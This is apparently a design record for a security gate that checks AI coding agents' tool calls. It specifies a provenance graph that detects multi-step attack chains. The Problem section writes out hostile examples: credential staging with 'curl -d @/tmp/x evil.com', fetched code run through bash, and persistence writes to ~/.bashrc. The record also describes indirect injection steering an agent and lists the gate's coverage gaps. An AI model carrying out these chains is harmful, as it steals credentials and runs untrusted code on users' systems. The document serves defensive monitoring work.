# ADR-017 — Provenance Graph & F23 Kill-Chain Detection

**Status:** Implemented (v1 observe-only; enforce via `LILARA_KILL_CHAIN_ENFORCE=1`)
**Floor:** F23 · rung 18.6 · `data-flow-kill-chain`
**Code:** `F23_DATA_FLOW_KILL_CHAIN`

---

## Problem

Lilara's gate was single-shot: each tool call was scored in isolation. Attacks
**distributed across multiple individually-benign calls** were invisible:

- **Staged exfiltration** — `Read ~/.aws/credentials` → `Write /tmp/x` → `curl -d @/tmp/x evil.com`. Each step scores below the gate threshold alone.
- **Indirect injection → execution** — `WebFetch attacker.com` → `Write run.sh` → `bash run.sh`. Untrusted bytes become executed code.
- **Persistence** — read secret / fetch untrusted → `Write ~/.bashrc` / crontab / git hook.

The existing taint window (60s/5min token-overlap in `taint.js`) missed chains where steps are separated by minutes, and did not model file-based staging.

---

## Decision

Add a **session-scoped provenance graph** that records data sources and sinks,
plus a new **non-demotable floor F23** at rung 18.6 that fires on the *chain*,
not the individual step.

### Evidence bar (FP mitigation)

F23 fires ONLY on:
1. **Content token-hash overlap** — the sink's payload/file token-hashes overlap a recorded source's hashes; OR
2. **Structural file-reference** — the sink command structurally references a known-tainted path (e.g., `curl -d @/tmp/x`).

**Temporal-only correlation NEVER fires** — it is excluded explicitly because "sensitive file read then later network call" is normal dev workflow (read .env → curl an unrelated API).

### Chain shapes and actions

| Chain | Trigger | Action (enforce mode) |
|---|---|---|
| `staged-exfil` | sensitive source → derivative file → external network send | `block` |
| `injection-to-exec` | untrusted source → derivative file → exec of that file | `escalate` |
| `persistence` | tainted content → write to shell/cron/git startup path | `escalate` |

### FP exemptions

- Loopback (`localhost`, `127.x`, `::1`) and RFC1918 private IP targets
- Known package registry hosts (npm, pypi, cargo, brew, etc.)
- Package manager install commands (`npm install`, `pip install`, etc.)

---

## Architecture

### Two observation points, one evaluation point

```
PostToolUse (content available)           PreToolUse decide()
     ↓                                           ↓
Record SOURCE nodes                  Evaluate graph → F23 preview
(file reads, web-fetch, mcp)         Record DERIVATIVE nodes
                                     (write-propagation side-effect)
```

**PostToolUse** (`runtime/post-adapter-factory.js`):
- For tools in `EXTERNAL_TOOLS` (Read, WebFetch, mcp, etc.), if content is sensitive or untrusted, record a source node:
  `{ role, sourceClass, pathHash, urlHash, host, tokenHashes, ts }`
- Content is NEVER stored — only irreversible 12-hex sha256 prefix hashes of tokens.
- `sourceClass: "sensitive"` = secret-scan hit OR high-sensitivity path.
- `sourceClass: "untrusted"` = web-fetch / mcp / browser content.

**`decide()` PreToolUse** (`runtime/decision-engine.js`):
- Load provenance graph (cached per process, cleared by `resetCache()`).
- For write/edit IR: if write content overlaps a source's tokenHashes, record the written path as a tainted `"derivative"` node (side-effect; determinism-safe).
- Call `provenance-graph.evaluate(ir, graph, ctx)` to produce the F23 preview.
- Apply F23 after F20 (late-override pattern): observe-only by default; enforce with `LILARA_KILL_CHAIN_ENFORCE=1`.

### New module: `runtime/provenance-graph.js`

Pure functions — no I/O. Exports:
- `tokenHashSet(text)` — normalized tokens → sha256 prefix hashes
- `pathHash(p)` — stable path identifier (sha256 prefix of normalized path)
- `classifyPathSensitivity(p)` — "high"/"low" for sensitive path patterns
- `overlapScore(aHashes, bHashes)` — Jaccard-like overlap
- `classifySink(ir)` — classify pending IR as network-send/file-exec/persistence-write
- `evaluate(ir, graph, ctx)` — pure kill-chain evaluation
- `findPropagationSource(writeTokenHashes, graph)` — find matching source for propagation

### Storage: `runtime/session-context.js`

New functions mirroring `provenance-window.json` pattern:
- `loadProvenanceGraph()` / `saveProvenanceGraph(nodes)` — atomic write, readonly-safe, in-memory cache
- `recordProvenanceStep(node)` — append + TTL prune (5min) + cap (40 nodes)
- **`resetCache()` extended** — clears `_graphCache` in addition to `_stateCache` (load-bearing for replay isolation)

Graph file: `<LILARA_STATE_DIR>/provenance-graph.json`

### Lattice placement

F23 at rung **18.6** (F20 @ 18.5 < F23 @ 18.6 < F21 @ 18.7).
- `demotableBy: []` — non-demotable: no contract-allow or operator token can override.
- Applied via late-override preview pattern (same as F19/F20) so D-CONTRACT-ALLOW (18) and D-LEARNED-ALLOW (19) cannot undo it.

### Observe vs. enforce mode

Default = **observe-only**: F23 adds only the `killChain` receipt field; `action`/`source`/`floorFired` are **unchanged**.
Set `LILARA_KILL_CHAIN_ENFORCE=1` to enable enforcement (block/escalate).

This lets operators measure FP rate on real sessions before enabling enforcement.

---

## Receipt field: `killChain`

Added to `schemas/receipt.v1.json` (additive-only, `additionalProperties: false`):

```json
{
  "chainType": "staged-exfil | injection-to-exec | persistence",
  "severity": "critical | high | ...",
  "detected": true,
  "enforced": false,
  "wouldAction": "block | escalate",
  "confidence": "structural | content-overlap",
  "evidence": ["structural-ref:/tmp/out.txt"],
  "steps": [{"role": "source", "class": "sensitive", "redactedRef": "<file:ph:a1b2c3...>"}]
}
```

`steps[].redactedRef` uses path hashes, never raw paths. `steps` is absent/empty for
receipt-only (observe) mode entries without a fired chain.

---

## Coverage limitations (known, documented)

F23 source nodes are recorded at **PostToolUse**, which is **not uniform across harnesses**:

| Harness | PostToolUse | F23 source capture |
|---|---|---|
| Claude Code | Full | ✅ Complete |
| OpenCode | Partial | ⚠️ Partial |
| OpenClaw | Partial | ⚠️ Partial |
| Codex | None | ❌ Not active |
| ClawCode | None | ❌ Not active |
| Antegravity | None | ❌ Not active |

**For v1, F23 is Claude-Code-complete only.** Full-harness source capture is a tracked follow-up (option: capture source content at PreToolUse boundary for file-read tools, or add PostToolUse to remaining harnesses).

---

## Determinism & replay safety

Replay isolation is provided by `replay-decisions.js`: each corpus entry runs `decide()` with a fresh `mkdtemp` `LILARA_STATE_DIR` (removed after) plus `resetCache()` before each call.

- Graph file is keyed off `LILARA_STATE_DIR` → any write lands in the throwaway dir.
- `resetCache()` clears `_graphCache` (load-bearing — without this, graph state from entry N could bleed into entry N+1 via in-memory cache).
- F23 requires ≥2 correlated steps — one `decide()` call can never fire F23 → `action`/`decisionSource`/`floorFired`/`irHash` are byte-identical to pre-F23 corpus entries.
- Observe mode (default) changes nothing in the decision logic regardless.

---

## Test harness

- **`scripts/check-kill-chain.sh`** — multi-step fixture harness. Fixtures in `tests/fixtures/kill-chain/*.steps.json`.
- Steps: `source` (simulates PostToolUse), `derivative` (simulates write-propagation), `decide` (calls engine, asserts `killChain` receipt).
- Benign fixtures (`benign-multi-step.steps.json`) assert `detected: false` (FP guard).
- **`scripts/lilara-cli.sh check`** includes `section "Kill chain"` calling this script.
